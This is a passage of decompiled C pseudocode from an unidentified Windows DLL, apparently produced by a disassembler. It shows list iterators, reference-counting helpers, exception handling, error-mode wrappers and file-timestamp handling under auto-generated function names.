  (*(void (__thiscall **)(int, int *))(*(_DWORD *)a1 + 8))(a1, v5);
  v6 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v5[0] + 4))(v5[0]) )
  {
    v3 = (*(int (__thiscall **)(int))(*(_DWORD *)v5[0] + 12))(v5[0]);
    (*(void (__thiscall **)(int, int))(*(_DWORD *)a2 + 36))(a2, v3);
    sub_1000FA25(v4, v5[0]);
  }
  v6 = -1;
  sub_10010109(v5);
}
// 1000FA8F: variable 'v4' is possibly undefined

//----- (1000FAB2) --------------------------------------------------------
_DWORD *__thiscall sub_1000FAB2(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10093898;
  a2[1] = this;
  a2[2] = a4;
  *a2 = &off_1009391C;
  a2[3] = a3;
  return result;
}
// 10093898: using guessed type int (__thiscall *off_10093898)(void *Block, char);
// 1009391C: using guessed type int (__thiscall *off_1009391C)(void *Block, char);

//----- (1000FAEC) --------------------------------------------------------
void __thiscall sub_1000FAEC(_DWORD *this)
{
  *this = &off_1009391C;
  *this = &off_10093898;
}
// 10093898: using guessed type int (__thiscall *off_10093898)(void *Block, char);
// 1009391C: using guessed type int (__thiscall *off_1009391C)(void *Block, char);

//----- (1000FB11) --------------------------------------------------------
BOOL __thiscall sub_1000FB11(_DWORD *this)
{
  return this[3] == 0;
}

//----- (1000FB1A) --------------------------------------------------------
BOOL __thiscall sub_1000FB1A(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1000FB23) --------------------------------------------------------
int __thiscall sub_1000FB23(_DWORD *this)
{
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  result = this[3];
  if ( !result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (1000FB47) --------------------------------------------------------
int __thiscall sub_1000FB47(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[3];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 24);
  this[3] = result;
  return result;
}

//----- (1000FB74) --------------------------------------------------------
int __thiscall sub_1000FB74(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 28);
  this[2] = result;
  return result;
}

//----- (1000FBA1) --------------------------------------------------------
int *__thiscall sub_1000FBA1(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int *result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v3 = *(_DWORD *)(v2 + 24);
  v4 = *(_DWORD *)(this + 8);
  if ( v4 )
    *(_DWORD *)(v4 + 24) = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 28) = *(_DWORD *)(this + 8);
  v5 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v5 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v5 + 4) = v3;
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 8) = *(_DWORD *)(this + 8);
  result = *(int **)(this + 12);
  if ( result )
    result = sub_1000F93C(*(int **)(this + 12));
  *(_DWORD *)(this + 12) = v3;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (1000FC17) --------------------------------------------------------
_DWORD *__thiscall sub_1000FC17(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[6]; // [esp-20h] [ebp-44h] BYREF
  int v7; // [esp-8h] [ebp-2Ch]
  int v8; // [esp-4h] [ebp-28h]
  int *v9; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v11; // [esp+20h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x20u);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_1000FEA5(a2, v6);
    LOBYTE(v11) = 0;
    result = sub_1000FF94(Block, v6[0], v6[1], v6[2], v6[3], v6[4], v6[5], v7, v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 24) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 28) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000FC9C) --------------------------------------------------------
_DWORD *__thiscall sub_1000FC9C(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_100938B8;
  a2[1] = this;
  a2[2] = a4;
  *a2 = &off_1009393C;
  a2[3] = a3;
  return result;
}
// 100938B8: using guessed type int (__thiscall *off_100938B8)(void *Block, char);
// 1009393C: using guessed type int (__thiscall *off_1009393C)(void *Block, char);

//----- (1000FCD6) --------------------------------------------------------
void __thiscall sub_1000FCD6(_DWORD *this)
{
  *this = &off_1009393C;
  *this = &off_100938B8;
}
// 100938B8: using guessed type int (__thiscall *off_100938B8)(void *Block, char);
// 1009393C: using guessed type int (__thiscall *off_1009393C)(void *Block, char);

//----- (1000FCFB) --------------------------------------------------------
BOOL __thiscall sub_1000FCFB(_DWORD *this)
{
  return this[3] == 0;
}

//----- (1000FD04) --------------------------------------------------------
BOOL __thiscall sub_1000FD04(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1000FD0D) --------------------------------------------------------
int __thiscall sub_1000FD0D(_DWORD *this)
{
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  result = this[3];
  if ( !result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (1000FD31) --------------------------------------------------------
int __thiscall sub_1000FD31(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[3];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 24);
  this[3] = result;
  return result;
}

//----- (1000FD5E) --------------------------------------------------------
int __thiscall sub_1000FD5E(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 28);
  this[2] = result;
  return result;
}

//----- (1000FD8B) --------------------------------------------------------
int *__thiscall sub_1000FD8B(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int *result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v3 = *(_DWORD *)(v2 + 24);
  v4 = *(_DWORD *)(this + 8);
  if ( v4 )
    *(_DWORD *)(v4 + 24) = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 28) = *(_DWORD *)(this + 8);
  v5 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v5 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v5 + 4) = v3;
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 8) = *(_DWORD *)(this + 8);
  result = *(int **)(this + 12);
  if ( result )
    result = sub_1000F93C(*(int **)(this + 12));
  *(_DWORD *)(this + 12) = v3;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (1000FE01) --------------------------------------------------------
_DWORD *__thiscall sub_1000FE01(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[6]; // [esp-20h] [ebp-44h] BYREF
  int v7; // [esp-8h] [ebp-2Ch]
  int v8; // [esp-4h] [ebp-28h]
  int *v9; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v11; // [esp+20h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x20u);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_1000FEA5(a2, v6);
    LOBYTE(v11) = 0;
    result = sub_1000FF94(Block, v6[0], v6[1], v6[2], v6[3], v6[4], v6[5], v7, v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 24) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 28) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000FE86) --------------------------------------------------------
_DWORD *__thiscall sub_1000FE86(_DWORD *Block, char a2)
{
  sub_1000FAEC(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000FEA5) --------------------------------------------------------
_DWORD *__thiscall sub_1000FEA5(_DWORD *this, _DWORD *a2)
{
  volatile LONG *v4; // [esp-4h] [ebp-20h]

  sub_1000FF31((int)this, a2);
  *a2 = &off_10093810;
  a2[4] = this[4];
  v4 = (volatile LONG *)a2[4];
  a2[3] = this[3];
  InterlockedIncrement(v4);
  a2[5] = this[5];
  return a2;
}
// 10093810: using guessed type int (__thiscall *off_10093810)(void *Block, char);

//----- (1000FEF3) --------------------------------------------------------
_DWORD *__thiscall sub_1000FEF3(_DWORD *Block, char a2)
{
  sub_1000FCD6(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000FF12) --------------------------------------------------------
int *__thiscall sub_1000FF12(int *Block, char a2)
{
  sub_100264A5(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000FF31) --------------------------------------------------------
_DWORD *__userpurge sub_1000FF31@<eax>(int a1@<edi>, _DWORD *a2)
{
  sub_1000ECE5(a1, a2);
  *a2 = &off_100937C0;
  return a2;
}
// 100937C0: using guessed type int (__thiscall *off_100937C0)(void *Block, char);

//----- (1000FF5E) --------------------------------------------------------
int *__thiscall sub_1000FF5E(int *Block, char a2)
{
  sub_10001FCC(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000FF94) --------------------------------------------------------
_DWORD *__stdcall sub_1000FF94(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9)
{
  sub_1000FEA5(&a2, a1);
  a1[6] = a8;
  a1[7] = a9;
  sub_100264A5(&a2);
  return a1;
}

//----- (1000FFF2) --------------------------------------------------------
void __thiscall sub_1000FFF2(void *this)
{
  sub_1001014C((int)this);
}

//----- (1001001D) --------------------------------------------------------
int __userpurge sub_1001001D@<eax>(__int32 a1@<eax>, int a2)
{
  sub_10010174(a1);
  return a2;
}

//----- (10010046) --------------------------------------------------------
_DWORD *__userpurge sub_10010046@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10010085) --------------------------------------------------------
void __thiscall sub_10010085(void *this)
{
  sub_100101FD((int)this);
}

//----- (100100CA) --------------------------------------------------------
_DWORD *__userpurge sub_100100CA@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10010109) --------------------------------------------------------
void __thiscall sub_10010109(void *this)
{
  sub_10010237((int)this);
}

//----- (1001014C) --------------------------------------------------------
void __usercall sub_1001014C(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10010174) --------------------------------------------------------
int __usercall sub_10010174@<eax>(__int32 a1@<eax>)
{
  int v1; // ecx
  int result; // eax
  void *v3; // eax
  int v4; // ecx
  _DWORD v5[2]; // [esp+10h] [ebp-18h] BYREF
  void *Block[3]; // [esp+18h] [ebp-10h] BYREF
  int v7; // [esp+24h] [ebp-4h]

  v1 = dword_100BBD44;
  result = _InterlockedExchange((volatile __int32 *)Block, a1);
  if ( !v1 )
  {
    sub_100171BE(dword_100BFA4C, v5);
    v7 = 0;
    if ( !dword_100BBD44 )
    {
      v3 = operator new(0x34u);
      Block[0] = v3;
      LOBYTE(v7) = 1;
      if ( v3 )
      {
        v3 = (void *)sub_1000F08C((int)v3);
        v4 = (int)v3;
      }
      else
      {
        v4 = 0;
      }
      LOBYTE(v7) = 0;
      _InterlockedExchange((volatile __int32 *)Block, (__int32)v3);
      dword_100BBD44 = v4;
      dword_100BC744 = v4;
    }
    v7 = -1;
    return sub_100171F2(v5);
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 100BBD44: using guessed type int dword_100BBD44;
// 100BC744: using guessed type int dword_100BC744;
// 100BFA4C: using guessed type int dword_100BFA4C[9];
// 10010174: using guessed type _DWORD var_18[2];

//----- (100101FD) --------------------------------------------------------
void __usercall sub_100101FD(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10010237) --------------------------------------------------------
void __usercall sub_10010237(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1001029F) --------------------------------------------------------
_DWORD *__stdcall sub_1001029F(_DWORD *a1, int a2, int a3)
{
  *a1 = &off_10092F00;
  *a1 = &off_1009395C;
  sub_1000CE26(a1 + 1, a2);
  a1[3] = a3;
  return a1;
}
// 10092F00: using guessed type int (__thiscall *off_10092F00)(void *Block, char);
// 1009395C: using guessed type int (__thiscall *off_1009395C)(void *Block, char);

//----- (100102E2) --------------------------------------------------------
int *__thiscall sub_100102E2(int *Block, char a2)
{
  sub_10010301(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10010301) --------------------------------------------------------
LONG __thiscall sub_10010301(int *this)
{
  LONG result; // eax

  *this = (int)&off_1009395C;
  result = sub_1000CE59(this + 1);
  *this = (int)&off_10092F00;
  return result;
}
// 10092F00: using guessed type int (__thiscall *off_10092F00)(void *Block, char);
// 1009395C: using guessed type int (__thiscall *off_1009395C)(void *Block, char);

//----- (10010334) --------------------------------------------------------
char __thiscall sub_10010334(_DWORD **this)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  bool v4; // bl
  int v5; // ecx
  char v6; // bl
  int v8[2]; // [esp+14h] [ebp-30h] BYREF
  int v9[2]; // [esp+1Ch] [ebp-28h] BYREF
  _DWORD v10[5]; // [esp+24h] [ebp-20h] BYREF
  int v11; // [esp+40h] [ebp-4h]

  (*(void (__thiscall **)(_DWORD *, int *))(*this[3] + 8))(this[3], v8);
  v11 = 0;
  if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v8[0] + 4))(v8[0]) )
  {
LABEL_4:
    v6 = 0;
  }
  else
  {
    while ( 1 )
    {
      v2 = (_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)v8[0] + 12))(v8[0]);
      sub_1000AA12(v10, v2);
      LOBYTE(v11) = 1;
      v3 = sub_1001D7F9((int)v10, v9);
      LOBYTE(v11) = 2;
      v4 = sub_1000D84E((int)v3, (int)(this + 1));
      LOBYTE(v11) = 1;
      sub_1000CE59(v9);
      if ( v4 )
        break;
      sub_1000A59A(v5, v8[0]);
      LOBYTE(v11) = 0;
      sub_1000A4C9((int)v10);
      if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v8[0] + 4))(v8[0]) )
        goto LABEL_4;
    }
    LOBYTE(v11) = 0;
    sub_1000A4C9((int)v10);
    v6 = 1;
  }
  v11 = -1;
  sub_1000AE88(v8);
  return v6;
}
// 100103D0: variable 'v5' is possibly undefined
// 10010334: using guessed type _DWORD var_20[5];

//----- (10010428) --------------------------------------------------------
int __usercall sub_10010428@<eax>(int a1@<esi>)
{
  *(_DWORD *)a1 = off_1009396C;
  *(_BYTE *)(a1 + 4) = 0;
  *(_DWORD *)(a1 + 8) = _set_se_translator((void (__cdecl *)(unsigned int, struct _EXCEPTION_POINTERS *))sub_100104AB);
  *(_BYTE *)(a1 + 4) = 1;
  return a1;
}
// 1004E815: using guessed type void (__cdecl *__cdecl _set_se_translator(void (__cdecl *)(unsigned int, struct _EXCEPTION_POINTERS *)))(unsigned int, struct _EXCEPTION_POINTERS *);
// 1009396C: using guessed type int (__thiscall *off_1009396C[2])(void *Block, char);

//----- (10010447) --------------------------------------------------------
_DWORD *__thiscall sub_10010447(_DWORD *Block, char a2)
{
  sub_10010466(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10010466) --------------------------------------------------------
void (__cdecl *__thiscall sub_10010466(_DWORD *this))(unsigned int, struct _EXCEPTION_POINTERS *)
{
  *this = off_1009396C;
  return sub_10010497((int)this);
}
// 1009396C: using guessed type int (__thiscall *off_1009396C[2])(void *Block, char);

//----- (10010497) --------------------------------------------------------
void (__cdecl *__usercall sub_10010497@<eax>(int a1@<esi>))(unsigned int, struct _EXCEPTION_POINTERS *)
{
  void (__cdecl *result)(unsigned int, struct _EXCEPTION_POINTERS *); // eax

  if ( *(_BYTE *)(a1 + 4) )
  {
    result = _set_se_translator(*(void (__cdecl **)(unsigned int, struct _EXCEPTION_POINTERS *))(a1 + 8));
    *(_BYTE *)(a1 + 4) = 0;
  }
  return result;
}
// 1004E815: using guessed type void (__cdecl *__cdecl _set_se_translator(void (__cdecl *)(unsigned int, struct _EXCEPTION_POINTERS *)))(unsigned int, struct _EXCEPTION_POINTERS *);

//----- (100104AB) --------------------------------------------------------
void __cdecl __noreturn sub_100104AB(int a1, int **a2)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_10016637(pExceptionObject, **a2);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVHfpmmmiamaHpnxxaqhf_sr__);
}
// 100104AB: using guessed type _DWORD pExceptionObject[2];

//----- (100104CF) --------------------------------------------------------
_DWORD *__thiscall sub_100104CF(_DWORD *this, int a2)
{
  sub_10016406(this, a2);
  *this = &off_10093964;
  this[1] = *(_DWORD *)(a2 + 4);
  return this;
}
// 10093964: using guessed type int (__thiscall *off_10093964)(void *Block, char);

//----- (10010507) --------------------------------------------------------
_DWORD *__thiscall sub_10010507(_DWORD *Block, char a2)
{
  sub_1001666B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10010526) --------------------------------------------------------
_DWORD *__usercall sub_10010526@<eax>(_DWORD *a1@<esi>)
{
  *a1 = &off_10093970;
  a1[1] = SetErrorMode(0x8001u);
  return a1;
}
// 10093970: using guessed type int (__thiscall *off_10093970)(void *Block, char);

//----- (1001053D) --------------------------------------------------------
_DWORD *__thiscall sub_1001053D(_DWORD *Block, char a2)
{
  sub_1001055C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001055C) --------------------------------------------------------
UINT __thiscall sub_1001055C(_DWORD *this)
{
  *this = &off_10093970;
  return SetErrorMode(this[1]);
}
// 10093970: using guessed type int (__thiscall *off_10093970)(void *Block, char);

//----- (1001058F) --------------------------------------------------------
int __stdcall sub_1001058F(int a1, int a2, _DWORD *a3, int a4, int a5, int a6, volatile LONG *lpAddend)
{
  int v8; // [esp+0h] [ebp-28h] BYREF
  volatile LONG *v9; // [esp+4h] [ebp-24h]
  int *v10; // [esp+18h] [ebp-10h]
  int v11; // [esp+24h] [ebp-4h]

  v11 = 0;
  v10 = &v8;
  v9 = lpAddend;
  v8 = a6;
  InterlockedIncrement(lpAddend);
  LOBYTE(v11) = 0;
  sub_10011AFB(3, -1073741824, (_DWORD *)a1, a2, 128, a5, v8, v9);
  LOBYTE(v11) = 2;
  *(_DWORD *)a1 = &off_100939B8;
  *(_DWORD *)(a1 + 40) = *a3;
  *(_DWORD *)(a1 + 44) = a3[1];
  *(_DWORD *)(a1 + 48) = a4;
  *(_BYTE *)(a1 + 52) = 0;
  v11 = -1;
  sub_100015D8(&a6);
  return a1;
}
// 100939B8: using guessed type int (__thiscall *off_100939B8)(void *Block, char);

//----- (10010614) --------------------------------------------------------
HANDLE *__thiscall sub_10010614(HANDLE *Block, char a2)
{
  sub_10010768(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10010633) --------------------------------------------------------
int __stdcall sub_10010633(int a1, int a2, _DWORD *a3, int a4, volatile LONG *lpAddend)
{
  int v6; // [esp+0h] [ebp-28h] BYREF
  volatile LONG *v7; // [esp+4h] [ebp-24h]
  int *v8; // [esp+18h] [ebp-10h]
  int v9; // [esp+24h] [ebp-4h]

  v9 = 0;
  v8 = &v6;
  v7 = lpAddend;
  v6 = a4;
  InterlockedIncrement(lpAddend);
  LOBYTE(v9) = 0;
  sub_10011AFB(-1, 256, (_DWORD *)a1, a2, 128, 3, v6, v7);
  LOBYTE(v9) = 2;
  *(_DWORD *)a1 = &off_100939B8;
  *(_DWORD *)(a1 + 40) = *a3;
  *(_DWORD *)(a1 + 44) = a3[1];
  *(_DWORD *)(a1 + 48) = 1;
  *(_BYTE *)(a1 + 52) = 0;
  v9 = -1;
  sub_100015D8(&a4);
  return a1;
}
// 100939B8: using guessed type int (__thiscall *off_100939B8)(void *Block, char);

//----- (100106B7) --------------------------------------------------------
int __userpurge sub_100106B7@<eax>(int a1@<edi>, int a2, int a3, int a4, volatile LONG *lpAddend)
{
  int v6; // [esp+0h] [ebp-28h] BYREF
  volatile LONG *v7; // [esp+4h] [ebp-24h]
  int *v8; // [esp+18h] [ebp-10h]
  int v9; // [esp+24h] [ebp-4h]

  v9 = 0;
  v8 = &v6;
  v7 = lpAddend;
  v6 = a4;
  InterlockedIncrement(lpAddend);
  LOBYTE(v9) = 0;
  sub_10011AFB(-1, a1, (_DWORD *)a2, a3, 128, 3, v6, v7);
  *(_DWORD *)a2 = &off_100939B8;
  *(_BYTE *)(a2 + 52) = 1;
  v9 = -1;
  sub_100015D8(&a4);
  return a2;
}
// 100939B8: using guessed type int (__thiscall *off_100939B8)(void *Block, char);

//----- (10010721) --------------------------------------------------------
int __thiscall sub_10010721(int this, int a2)
{
  sub_10011BDB((_DWORD *)this, (_DWORD *)a2);
  *(_DWORD *)a2 = &off_100939B8;
  *(_DWORD *)(a2 + 40) = *(_DWORD *)(this + 40);
  *(_DWORD *)(a2 + 44) = *(_DWORD *)(this + 44);
  *(_DWORD *)(a2 + 48) = *(_DWORD *)(this + 48);
  *(_BYTE *)(a2 + 52) = *(_BYTE *)(this + 52);
  return a2;
}
// 100939B8: using guessed type int (__thiscall *off_100939B8)(void *Block, char);

//----- (10010768) --------------------------------------------------------
LONG __thiscall sub_10010768(HANDLE *this)
{
  *this = &off_100939B8;
  sub_10010B8D(this);
  return sub_10011C44((int)this);
}
// 100939B8: using guessed type int (__thiscall *off_100939B8)(void *Block, char);

//----- (100107AA) --------------------------------------------------------
LONG __thiscall sub_100107AA(void *this)
{
  LONG result; // eax
  int v3; // eax
  _DWORD *v4; // esi
  int v5; // eax
  volatile LONG *v6; // ecx
  volatile LONG *v7; // ecx
  volatile LONG *v8; // [esp-14h] [ebp-98h] BYREF
  volatile LONG *v9; // [esp-10h] [ebp-94h]
  volatile LONG *v10; // [esp-Ch] [ebp-90h] BYREF
  volatile LONG *v11; // [esp-8h] [ebp-8Ch]
  HANDLE v12[10]; // [esp+10h] [ebp-74h] BYREF
  _DWORD pExceptionObject[4]; // [esp+38h] [ebp-4Ch] BYREF
  struct _FILETIME v14; // [esp+48h] [ebp-3Ch] BYREF
  int v15[2]; // [esp+50h] [ebp-34h] BYREF
  int v16[2]; // [esp+58h] [ebp-2Ch] BYREF
  FILETIME v17; // [esp+60h] [ebp-24h] BYREF
  __int64 v18; // [esp+68h] [ebp-1Ch] BYREF
  bool v19; // [esp+73h] [ebp-11h]
  int v20; // [esp+80h] [ebp-4h]

  HIDWORD(v18) = this;
  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 12))(this);
  if ( !(_BYTE)result )
  {
    v19 = !sub_10020CD2((int)this + 8);
    v17.dwLowDateTime = 0;
    v17.dwHighDateTime = 0;
    (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 24))(this, v15);
    v20 = 0;
    v3 = sub_1000D88B((int)v15, 0x5Cu);
    sub_1000D2DE((int)v15, 0, v16, v3 + 1);
    LOBYTE(v20) = 1;
    v4 = (_DWORD *)HIDWORD(v18);
    if ( v19 )
    {
      if ( *(_BYTE *)(HIDWORD(v18) + 52) )
      {
        sub_10027C51(pExceptionObject);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
      }
      *(_DWORD *)(HIDWORD(v18) + 56) = *(_DWORD *)(HIDWORD(v18) + 40);
      v4[15] = v4[11];
      v5 = v4[12];
      v4[16] = v5;
      v4[17] = v4[10];
      v6 = (volatile LONG *)v4[11];
      v4[18] = v6;
      v4[19] = v5;
      v11 = v6;
      v10 = v6;
      HIDWORD(v18) = &v10;
      sub_10014512(&v10);
      LOBYTE(v20) = 1;
      sub_10011AFB(7, 0x80000000, v12, (int)v16, 0x2000000, 3, (int)v10, v11);
      LOBYTE(v20) = 3;
      sub_10011CA3(v12);
      v17 = (FILETIME)*sub_10012058(v12, &v18, 1);
      LOBYTE(v20) = 1;
      sub_10011C44((int)v12);
    }
    else
    {
      sub_10012362(
        (struct _FILETIME *)(HIDWORD(v18) + 68),
        &v14,
        (HANDLE *)HIDWORD(v18),
        (struct _FILETIME *)(HIDWORD(v18) + 56));
      v4[19] = 1;
      v4[16] = 1;
    }
    sub_10011CA3(v4);
    if ( v19 )
    {
      (*(void (__thiscall **)(_DWORD *))(*v4 + 116))(v4);
      (*(void (__thiscall **)(_DWORD *, _DWORD *, _DWORD))(*v4 + 84))(v4, v4 + 10, v4[12]);
      LOBYTE(v20) = 4;
      v9 = v7;
      v8 = v7;
      HIDWORD(v18) = &v8;
      sub_10014512(&v8);
      LOBYTE(v20) = 4;
      sub_10011AFB(7, 256, v12, (int)v16, 0x2000000, 3, (int)v8, v9);
      LOBYTE(v20) = 6;
      sub_10011CA3(v12);
      sub_1001209B(v12, &v17, 1);
      LOBYTE(v20) = 4;
      sub_10011C44((int)v12);
      v20 = 1;
    }
    LOBYTE(v20) = 0;
    sub_1000CE59(v16);
    v20 = -1;
    return sub_1000CE59(v15);
  }
  return result;
}
// 100108FD: variable 'v7' is possibly undefined
// 100107AA: using guessed type _DWORD pExceptionObject[4];
// 100107AA: using guessed type HANDLE var_74[10];

//----- (10010985) --------------------------------------------------------
void __thiscall sub_10010985(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 3;
  sub_10027CA8(this + 3);
  sub_1001646C(v1);
}

//----- (10010998) --------------------------------------------------------
_DWORD *__thiscall sub_10010998(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
